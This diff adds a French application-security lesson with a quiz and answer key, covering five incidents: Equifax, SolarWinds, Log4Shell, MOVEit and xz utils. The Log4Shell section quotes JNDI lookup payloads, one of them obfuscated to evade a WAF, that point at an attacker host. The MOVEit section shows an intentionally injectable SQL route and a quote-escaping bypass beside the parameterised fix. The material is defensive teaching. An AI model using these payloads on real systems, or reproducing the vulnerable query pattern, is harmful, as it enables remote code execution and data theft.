@@ -1,0 +1,152 @@
+export const questions = [
+  {
+    q: "Dans l'affaire xz utils (mars 2024), pourquoi un développeur qui relisait le dépôt Git du projet ne pouvait-il pas voir la porte dérobée ?",
+    options: [
+      "Parce que le code malveillant était chiffré dans un commit signé",
+      "Parce que le déclencheur n'existait que dans les archives de publication",
+      "Parce que la porte dérobée était téléchargée à l'exécution depuis un serveur",
+      "Parce que le dépôt Git avait été réécrit après coup par l'attaquant",
+    ],
+    answer: 1,
+    explain: "Andres Freund l'a relevé dès son message du 29 mars 2024 : la ligne qui déclenche l'injection se trouvait dans build-to-host.m4, présent uniquement dans les tarballs de 5.6.0 et 5.6.1, pas dans Git. Des fichiers de test binaires contenaient la charge, mais inoffensifs sans ce déclencheur. Rien n'était téléchargé à l'exécution, et le mainteneur a justement choisi de ne pas réécrire l'historique. D'où la règle : auditer l'artefact publié, pas seulement le dépôt.",
+  },
+  {
+    q: "Après Log4Shell, une équipe ajoute au WAF une règle qui bloque toute requête contenant la chaîne « jndi ». Pourquoi ce correctif ne tient-il pas ?",
+    options: [
+      "Parce que les attaquants passaient par LDAPS, que le WAF ne déchiffre pas",
+      "Parce que la charge peut arriver chiffrée en base64 dans un cookie",
+      "Parce que Log4j résout des lookups imbriqués qui reconstruisent le mot",
+      "Parce que le WAF ne voit pas les en-têtes, seulement le corps des requêtes",
+    ],
+    answer: 2,
+    explain: "Log4j évalue les lookups récursivement : une forme comme ${${lower:j}ndi:…} ne contient pas la chaîne « jndi », mais Log4j la reconstruit avant de l'interpréter. Le protocole du serveur rappelé (LDAP ou LDAPS) n'a rien à voir avec ce que le WAF inspecte à l'entrée. Le base64 n'est pas décodé par Log4j, il faudrait qu'une autre couche le fasse. Et un WAF inspecte bien les en-têtes. Le vrai correctif retire la fonctionnalité, il ne filtre pas un mot.",
+  },
+  {
+    q: "Quelle classe de vulnérabilité était au cœur de MOVEit Transfer (CVE-2023-34362), et qu'en a tiré la CISA ?",
+    options: [
+      "Une désérialisation non sûre, qui a mené à un guide sur les formats de données",
+      "Un contournement d'authentification, qui a mené au pledge sur la MFA",
+      "Un débordement mémoire, qui a mené aux feuilles de route memory-safe",
+      "Une injection SQL, qui a mené à une alerte Secure by Design dédiée",
+    ],
+    answer: 3,
+    explain: "L'avis AA23-158A décrit une injection SQL exploitée par CL0P pour déposer le web shell LEMURLOOT. En mars 2024, la CISA et le FBI ont publié une alerte Secure by Design pour éliminer les injections SQL, en citant l'exploitation d'une application de transfert de fichiers. Les autres associations sont plausibles mais fausses : le pledge et les feuilles de route memory-safe existent, sans lien direct avec cette affaire.",
+  },
+  {
+    q: "Qu'a démontré SolarWinds que l'analyse du code source n'aurait pas suffi à empêcher ?",
+    options: [
+      "Une compromission du build qui remplaçait un fichier source pendant la compilation",
+      "Une dépendance open source vulnérable embarquée dans le produit Orion",
+      "Une injection dans l'interface web d'Orion exploitée depuis Internet",
+      "Un mot de passe par défaut sur le serveur de mise à jour de l'éditeur",
+    ],
+    answer: 0,
+    explain: "D'après l'analyse de CrowdStrike, SUNSPOT surveillait MsBuild.exe et substituait un fichier source le temps de la compilation, puis restaurait l'original : le dépôt restait propre, le binaire signé ne l'était pas. Ni une dépendance vulnérable ni une injection web ne décrivent le mécanisme. Et aucune des analyses techniques publiées (Mandiant, CrowdStrike) ne fait passer SUNBURST par un mot de passe par défaut.",
+  },
+];
+
+<YouKnow>
+Beaucoup de pentesters ont cherché Log4Shell sur un périmètre en décembre 2021. Cette leçon reprend cinq affaires sous l'angle de l'AppSec : le mécanisme, la classe de bugs, et ce qu'elles ont changé dans le métier.
+</YouKnow>
+
+## Cinq affaires, cinq leçons
+
+| Affaire | Année | Mécanisme | Classe illustrée | Ce qui a changé |
+| --- | --- | --- | --- | --- |
+| **Equifax** | 2017 | Dépendance web vulnérable, connue et corrigée, non mise à jour | Composant vulnérable, inventaire absent | SCA, inventaire, délais de correction |
+| **SolarWinds** | 2020 | Build altéré, mise à jour signée et piégée | Compromission de la chaîne de build | SSDF, SBOM, intégrité du build (SLSA) |
+| **Log4Shell** | 2021 | Fonctionnalité d'interprétation dans une bibliothèque de journalisation | Injection par interprétation de données | Inventaire des dépendances transitives, SBOM |
+| **MOVEit** | 2023 | Injection SQL dans un logiciel de transfert de fichiers | Injection SQL, en 2023 | Secure by Design contre les classes connues |
+| **xz utils** | 2024 | Mainteneur infiltré, porte dérobée dans l'archive publiée | Confiance dans les mainteneurs et l'artefact | Auditer l'artefact, soutenir les mainteneurs |
+
+## Equifax : savoir ce qu'on fait tourner
+
+Le mécanisme technique est une injection d'expressions OGNL dans le parseur multipart Jakarta d'Apache Struts (**CVE-2017-5638**) : un en-tête `Content-Type` forgé suffisait à exécuter des commandes, sans authentification. Struts avait publié les versions corrigées (2.3.32 et 2.5.10.1) début mars 2017. Le GAO rapporte que des inconnus ont scanné Equifax le 10 mars, deux jours après l'alerte du US-CERT, et confirmé l'exécution de commandes sur le portail de contestation. L'exfiltration commence le 13 mai et dure environ 76 jours, jusqu'à sa découverte le 29 juillet ; au moins 145,5 millions de personnes sont touchées.
+
+La faille était **connue, corrigée, et invisible** pour qui devait la corriger (les autres facteurs sont en leçon 1). Equifax est devenu l'argument de référence pour l'**analyse de composition** (SCA) branchée sur un inventaire réel de la production, et pour des délais de correction avec un propriétaire nommé (M26).
+
+## SolarWinds : le build est une cible
+
+En décembre 2020, Mandiant révèle que des mises à jour signées du logiciel de supervision **Orion** contiennent une porte dérobée, SUNBURST, distribuée à partir de mars 2020. Le 13 décembre, la directive d'urgence ED 21-01 de la CISA ordonne aux agences fédérales de débrancher les versions 2019.4 à 2020.2.1 HF1. SolarWinds déclare à la SEC que moins de 18 000 clients ont pu installer une version piégée.
+
+C'est le mécanisme qui a marqué le métier. CrowdStrike a analysé l'outil posé sur la machine de build, **SUNSPOT** : il surveillait le processus `MsBuild.exe` et remplaçait un fichier source d'Orion par sa version piégée le temps de la compilation, puis restaurait l'original. Le dépôt restait propre ; le binaire signé ne l'était pas. Aucune revue de code, aucun SAST ne pouvait le voir.
+
+Ce que cela a changé : le décret présidentiel américain 14028 (12 mai 2021) charge le NIST de définir les pratiques de développement sécurisé attendues des fournisseurs de l'État fédéral, d'où le **NIST SSDF**, l'attestation de conformité et le **SBOM**. Côté pratique, SLSA et les attestations de provenance (M18, leçon 10) répondent à la question « ce binaire vient-il bien de ce code ? ».
+
+## Log4Shell : quand une donnée devient du code
+
+Le rapport du Cyber Safety Review Board (11 juillet 2022) retrace l'origine : en juillet 2013, le projet Log4j accepte une contribution qui ajoute les **lookups JNDI**. Huit ans plus tard, le 24 novembre 2021, un ingénieur d'Alibaba Cloud signale à l'Apache Software Foundation qu'un message journalisé contenant `${jndi:ldap://attaquant/x}` fait charger et exécuter du code distant. Le correctif 2.15.0 et la **CVE-2021-44228** (CVSS 10) sortent le 10 décembre, après une fuite de la preuve de concept. Le CSRB qualifie Log4j de **vulnérabilité endémique**, présente pour une décennie ou plus.
+
+La classe de bugs est plus large que Java : une bibliothèque **interprète** une donnée qu'on croyait inerte. Le mauvais correctif l'illustre bien. Bloquer « jndi » au WAF tombe devant `${${lower:j}ndi:ldap://…}`, que Log4j reconstruit avant de l'évaluer. Même le premier correctif officiel était incomplet : la **CVE-2021-45046** a montré que 2.15.0 restait exploitable dans certaines configurations non par défaut. On n'élimine pas une classe en filtrant une forme, on l'élimine en retirant l'interprétation.
+
+L'autre leçon est organisationnelle : la question « où tourne Log4j chez nous ? » est difficile quand la bibliothèque est une **dépendance transitive** embarquée dans des produits tiers. Le CSRB le souligne : un propriétaire peut ignorer où le composant vulnérable se trouve chez lui. C'est le cas d'usage qui a donné au SBOM son sens opérationnel.
+
+## MOVEit : une injection SQL en 2023
+
+L'avis conjoint CISA-FBI **AA23-158A** (7 juin 2023) décrit l'exploitation, à partir du 27 mai 2023, d'une injection SQL dans **MOVEit Transfer** (CVE-2023-34362) par le groupe CL0P. Le web shell déposé, LEMURLOOT (`human2.aspx`), permet d'énumérer les bases et de voler les fichiers. CL0P ne chiffre pas : il vole et menace de publier, comme il l'avait déjà fait avec d'autres logiciels de transfert (Accellion FTA, GoAnywhere).
+
+Ce que l'affaire a changé : en mars 2024, la CISA et le FBI publient une alerte *Secure by Design* consacrée à l'**élimination des injections SQL**, en citant l'exploitation d'une application de transfert de fichiers qui a touché des milliers d'organisations. Le message : vingt ans après, cette classe ne devrait plus exister. Dans une API Node, elle se loge dans les échappatoires des ORM :
+
+<Diff file="apps/api/src/routes/invoices-search.ts" hlBefore="3-5" hlAfter="3-7">
+
+```ts
+router.get('/invoices/search', async (req, res) => {
+  const q = String(req.query.q ?? '');
+  // « On échappe les apostrophes » : le mauvais correctif classique.
+  const safe = q.replace(/'/g, "''");
+  const rows = await prisma.$queryRawUnsafe(`SELECT * FROM invoices WHERE tenant_id = '${req.user.tenantId}' AND label ILIKE '%${safe}%'`);
+  res.json(rows);
+});
+```
+
+```ts
+router.get('/invoices/search', async (req, res) => {
+  const q = String(req.query.q ?? '');
+  // Gabarit étiqueté : Prisma envoie la requête et les valeurs séparément,
+  // aucune donnée ne peut devenir de la syntaxe SQL.
+  const rows = await prisma.$queryRaw`
+    SELECT id, label, amount FROM invoices
+    WHERE tenant_id = ${req.user.tenantId} AND label ILIKE ${'%' + q + '%'}`;
+  res.json(rows);
+});
+```
+
+</Diff>
+
+Doubler les apostrophes donne une illusion de sécurité. Dans cette même requête, `tenantId` n'est pas échappé : il suffit d'une valeur oubliée, ici ou dans une autre route. Et sur un moteur qui interprète l'antislash, comme MySQL dans sa configuration par défaut, la saisie `\'` devient `\''` : l'antislash neutralise la première apostrophe, la seconde ferme la chaîne. Seule la requête paramétrée, imposée par une règle de revue qui interdit `$queryRawUnsafe` (M16), la ferme.
+
+## xz utils : la confiance dans le mainteneur
+
+<Callout kind="case">
+Le 29 mars 2024, Andres Freund publie sur la liste oss-security l'analyse d'une porte dérobée dans **xz utils 5.6.0 et 5.6.1** (CVE-2024-3094), découverte en enquêtant sur des connexions SSH environ 500 ms plus lentes que d'habitude. La charge visait `sshd` de façon indirecte : sur Debian et les distributions RPM, `sshd` est lié à libsystemd, qui dépend de liblzma. Le déclencheur se trouvait dans un fichier `build-to-host.m4` présent **uniquement dans les archives publiées**, pas dans le dépôt Git. Le compte « Jia Tan » contribuait depuis fin 2021 ; des comptes tiers avaient fait pression en 2022 sur le mainteneur historique, épuisé, pour qu'il cède des droits. La CISA publie une alerte le jour même et recommande de revenir à une version antérieure.
+</Callout>
+
+Trois conséquences pour l'AppSec. **L'artefact publié n'est pas le dépôt** : ce qu'on installe depuis npm peut différer de ce qu'on lit sur GitHub, et c'est l'archive qu'il faut auditer (M18, leçon 7). **La santé d'un projet est un critère de sécurité** : un mainteneur seul et débordé est une surface d'attaque (M18, leçon 6). **La détection vient parfois d'un détail** : une latence de 500 ms, remarquée par quelqu'un qui mesurait autre chose.
+
+<Callout kind="novafact">
+« Où serait-elle chez nous ? » Equifax : une dépendance serveur plus suivie. SolarWinds : le runner qui construit le SDK. Log4Shell : le moteur de gabarits des e-mails de facture. MOVEit : trois `$queryRawUnsafe` trouvés par grep. xz : un paquet critique à mainteneur unique. Cinq réponses, cinq tickets.
+</Callout>
+
+<Recap items={[
+  "Equifax : une faille connue et corrigée, mais invisible faute d'inventaire ; SCA et délais de correction avec propriétaire.",
+  "SolarWinds : le build est une cible, le dépôt peut être propre et le binaire signé piégé ; SSDF, SBOM, provenance.",
+  "Log4Shell : une bibliothèque qui interprète une donnée ; filtrer une forme ne tient pas, retirer l'interprétation tient.",
+  "MOVEit : une injection SQL en 2023, qui a motivé une alerte Secure by Design pour éliminer la classe.",
+  "xz utils : l'archive publiée diffère du dépôt, et un mainteneur épuisé est une surface d'attaque.",
+]} />
+
+<Sources items={[
+  { title: "GAO-18-559, Data Protection: Actions Taken by Equifax and Federal Agencies (août 2018)", url: "https://www.gao.gov/products/gao-18-559" },
+  { title: "CISA, ED 21-01, Mitigate SolarWinds Orion Code Compromise (13 décembre 2020)", url: "https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise" },
+  { title: "Mandiant, Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor (13 décembre 2020)", url: "https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor" },
+  { title: "CrowdStrike, SUNSPOT: An Implant in the Build Process (11 janvier 2021)", url: "https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/" },
+  { title: "SolarWinds, formulaire 8-K (14 décembre 2020)", url: "https://www.sec.gov/Archives/edgar/data/1739942/000162828020017451/swi-20201214.htm" },
+  { title: "Cyber Safety Review Board, Review of the December 2021 Log4j Event (11 juillet 2022)", url: "https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf" },
+  { title: "Apache Logging Services, Log4j security vulnerabilities (CVE-2021-44228, CVE-2021-45046)", url: "https://logging.apache.org/security.html" },
+  { title: "CISA, AA23-158A, CL0P Ransomware Gang Exploits CVE-2023-34362 MOVEit Vulnerability (7 juin 2023)", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a" },
+  { title: "CISA et FBI, Secure by Design Alert: Eliminating SQL Injection Vulnerabilities in Software (25 mars 2024)", url: "https://www.cisa.gov/news-events/alerts/2024/03/25/cisa-and-fbi-release-secure-design-alert-urge-manufacturers-eliminate-sql-injection-vulnerabilities" },
+  { title: "Andres Freund, backdoor in upstream xz/liblzma (oss-security, 29 mars 2024)", url: "https://www.openwall.com/lists/oss-security/2024/03/29/4" },
+  { title: "Russ Cox, Timeline of the xz open source attack", url: "https://research.swtch.com/xz-timeline" },
+  { title: "NIST, Executive Order 14028 : sécurité de la chaîne logicielle", url: "https://www.nist.gov/itl/executive-order-14028-improving-nations-cybersecurity/software-security-supply-chains" },
+  { title: "CISA, Reported Supply Chain Compromise Affecting XZ Utils (29 mars 2024)", url: "https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094" },
+]} />
